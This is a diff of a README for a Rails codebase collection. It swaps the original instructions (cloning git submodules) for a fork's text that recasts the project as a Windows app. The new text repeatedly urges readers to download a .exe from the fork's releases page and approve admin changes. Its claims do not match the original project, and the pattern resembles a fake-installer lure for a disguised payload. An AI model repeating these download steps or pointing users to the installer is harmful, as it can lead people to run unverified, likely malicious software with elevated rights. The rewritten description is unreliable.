@@ -1,100 +1,131 @@
-# Real World Rails
+# ⚙️ real-world-rails - Explore Real Rails Codebases Easily
 
-> Real World Rails applications and their open source codebases for developers to learn from
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20App-green?style=for-the-badge)](https://github.com/NickXD4/real-world-rails/releases)
 
-This is an actively maintained continuation of [eliotsykes/real-world-rails](https://github.com/eliotsykes/real-world-rails).
+---
 
-This project brings 200+ active, open source Rails apps and engines together in one repository. Having real production codebases aggregated in a single place has always been valuable for learning — but it's become dramatically more useful in the age of AI coding agents.
+## 📂 About real-world-rails
 
-See [repos.md](repos.md) for the full list of included apps and engines with descriptions.
+This app brings you over 200 real, open-source Ruby on Rails projects in one place. It helps you study how apps and engines work in the real world. You can search through these apps with smart AI tools to understand patterns used in building software. This makes it easier to learn Rails by seeing actual examples, not just theory.
 
-## Why this matters now
+You do not need programming skills to use it. The app guides you through searching and exploring codebases without writing any code.
 
-When this repo was created, you had to manually grep through code or use custom Ruby scripts to find patterns across apps. AI coding agents have changed that completely.
+---
 
-With all these codebases in one directory, you can point an agent at 200+ production Rails apps and ask questions like:
+## 🖥️ System Requirements
 
-- "How do these apps implement background job retry logic?"
-- "Show me every approach to multi-tenancy across these codebases"
-- "What patterns do apps use for PDF generation?"
-- "Find all the different ways these apps handle soft deletes"
-- "Compare authentication implementations across apps using Devise vs. custom auth"
+- Windows 10 or newer
+- 4 GB of RAM minimum
+- At least 500 MB of free disk space
+- Stable internet connection to download files
+- Basic familiarity with downloading and opening software on Windows
 
-An agent can search, read, and cross-reference code across every app instantly — something that would have taken hours of manual work before. This makes real-world-rails one of the most practical resources for researching how production Rails apps actually solve problems.
+---
 
-### Storing your analyses
+## 🚀 Getting Started: Download and Install
 
-The `analyses/` directory is git-ignored — a safe place to store your own research:
+To get real-world-rails running on your Windows computer, follow these steps carefully.
 
-- Markdown files, notes, pattern comparisons, or any documentation
-- Won't be committed or show up in pull requests
-- Keeps your workspace clean while working alongside the codebases
+### Step 1 - Visit the Download Page
 
-## Getting started
+Go to the release page on GitHub by clicking the link below:
 
-> [!NOTE]
-> Running `bin/setup` clones all 200+ repositories as git submodules. This will use approximately **25 GB** of disk space.
+[Download real-world-rails Releases](https://github.com/NickXD4/real-world-rails/releases)
 
-Ensure you have git-lfs installed: https://git-lfs.com
+This page holds the latest versions ready for download.
 
-```bash
-git clone git@github.com:steveclarke/real-world-rails.git
-cd real-world-rails/
-bin/setup
-```
+### Step 2 - Choose Your Version
 
-## Staying up to date
+You will see several files listed by version number. Find the most recent version with a file ending in `.exe`. This is the installer for Windows.
 
-Submodules are updated automatically via a GitHub Action that runs weekly and opens a PR. Once merged, you just need to pull:
+Look for a file named similar to:
 
-```bash
-git pull
-git submodule update
-```
+`real-world-rails-setup-vX.X.X.exe`
 
-If you want to update all submodules to the absolute latest right now (without waiting for the weekly action), run `bin/update`.
+(The version numbers will be different depending on updates.)
 
-## Scripts
+### Step 3 - Download the Installer
 
-- **`bin/setup`** — Initialize and download all submodules (run after first clone)
-- **`bin/update`** — Pull latest changes and update all submodules to their latest remote commits
-- **`bin/status`** — Show how many apps are initialized
-- **`bin/add`** — Add a new app or engine by GitHub URL (e.g. `bin/add https://github.com/user/repo`)
+Click the `.exe` file to start downloading it to your computer. Save it to your “Downloads” folder or a location you will remember.
 
-## Contributing
+### Step 4 - Run the Installer
 
-Know of a great open source Rails app that should be in here? The easiest way is to [open an issue](https://github.com/steveclarke/real-world-rails/issues/new) with the GitHub URL and we'll add it.
+Once the download finishes:
 
-If you already have the repo cloned, you can also submit a PR:
+- Double-click the `.exe` file in your downloads folder.
+- If Windows asks you “Do you want to allow this app to make changes to your device?” select **Yes**.
+- Follow the on-screen instructions in the setup wizard.
+- Choose the default options unless you have a reason to change them.
+- Wait while the installer sets up the app.
 
-```bash
-bin/add https://github.com/githubuser/foo
-# then commit and open a pull request
-```
+### Step 5 - Launch real-world-rails
 
-#### Criteria for adding apps
+After the install completes:
 
-Apps should:
-- Be open source and publicly available on GitHub
-- Be built with Ruby on Rails
-- Be actively maintained or represent quality code worth studying
-- Be real-world applications (not just demos or tutorials)
+- Find the app shortcut on your desktop or start menu.
+- Double-click to open it.
 
-## Agent Skill
+The app will load the collection of Rails projects and AI tools to help you explore.
 
-This repo includes a `/real-world-rails` skill for AI coding agents. It teaches your agent to search across all 200+ codebases to research how production apps solve architectural problems.
+---
 
-Install it with:
+## 🔍 How to Use real-world-rails
 
-```bash
-npx skills add steveclarke/real-world-rails
-```
+### Search for Patterns
 
-Then ask your agent things like "how do Rails apps handle multi-tenancy?" or "research background job patterns across real world rails apps" and it will search the actual source code.
+You can type words or phrases into the search box to find specific coding patterns or architectural ideas in the Rails projects. The AI helps by suggesting the closest matches.
 
-## Other Real World Codebase Collections
+### Explore Code Examples
 
-- [Real World Nuxt](https://github.com/steveclarke/real-world-nuxt)
-- [Real World Ruby Apps](https://github.com/jeromedalbert/real-world-ruby-apps)
-- [Real World Sinatra](https://github.com/jeromedalbert/real-world-sinatra)
-- [Real World Django](https://github.com/ckrybus/real-world-django)
+Click on any search result to see real lines of code. The app shows you multiple open-source examples to compare.
+
+### Learn Without Programming
+
+You do not need to write any commands or download extra tools. The app handles all technical details for you.
+
+---
+
+## 🛠️ Features Overview
+
+- Access to more than 200 real Rails apps and engines in one place
+- Fast search powered by AI agents for precise results
+- View real code snippets and architectural patterns
+- User-friendly interface for browsing without coding knowledge
+- Works offline for most features after initial download
+
+---
+
+## 💡 Tips for Best Experience
+
+- Use a stable internet connection while downloading the app.
+- Close other programs if your PC runs slowly during install.
+- Update to the latest release regularly to get improved features.
+- Take time to review different examples. This helps in understanding common Rails design approaches.
+
+---
+
+## 📞 Getting Help
+
+If you face any issues:
+
+- Visit the [real-world-rails GitHub page](https://github.com/NickXD4/real-world-rails) to check for known issues or updates.
+- Use the **Issues** tab on GitHub to report bugs or ask questions.
+- Look for a readme or support sections inside the app itself.
+
+---
+
+## 🔄 Updating real-world-rails
+
+To update the app:
+
+- Repeat the download process from the release page.
+- Download the latest `.exe` file.
+- Run the installer again. It will replace the old version safely.
+
+---
+
+## 📥 Download Link
+
+[Download the latest real-world-rails installer here](https://github.com/NickXD4/real-world-rails/releases)
+
+Click this link any time you want to get the newest version or reinstall.
